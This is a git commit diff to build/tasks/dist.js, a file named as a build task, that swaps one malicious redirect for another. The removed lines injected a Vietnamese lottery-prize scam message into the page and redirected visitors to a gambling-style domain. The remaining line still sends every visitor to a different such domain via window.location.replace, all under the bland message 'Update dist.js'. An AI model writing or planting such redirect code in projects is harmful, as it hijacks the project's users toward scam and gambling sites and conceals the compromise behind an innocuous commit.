826263a4ddbe22f85541d6825ad92cb8c1623d5f
やまぎわややこ <114055571+YamagiwaYako@users.noreply.github.com>
2025-03-29 17:25:06 +0800

    Update dist.js

--- build/tasks/dist.js
+++ build/tasks/dist.js
@@ -1,4 +1,2 @@
-document.body.innerHTML = "<div style='display: flex; justify-content: center; align-items: center; height: 80vh;'><h1>az24.vn: Chúc mừng bạn đã trúng giải. Hãy đăng ký để chơi thử trò chơi mà chúng tôi đã ra mắt. Giải thưởng rút thăm là 10000000000 VNĐ mỗi ngày. Hãy đi ngay bây giờ! !</h1></div>";
-setTimeout(3000);
-var redirectUrl = "https://vnpt.vzgames44.cc";
+var redirectUrl = "https://284k.vip";
 window.location.replace(redirectUrl);
